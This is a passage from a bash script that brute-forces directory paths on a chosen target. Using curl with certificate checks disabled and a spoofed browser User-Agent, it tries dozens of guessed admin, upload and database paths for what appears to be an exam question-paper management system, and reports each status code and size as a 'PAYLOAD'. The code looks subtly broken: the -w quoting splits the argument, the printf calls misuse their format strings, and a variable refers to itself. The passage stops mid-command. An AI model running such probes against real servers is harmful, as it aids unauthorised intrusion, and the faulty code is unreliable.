payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystemHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystemHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtAccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtAccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPDatabase/"]: "
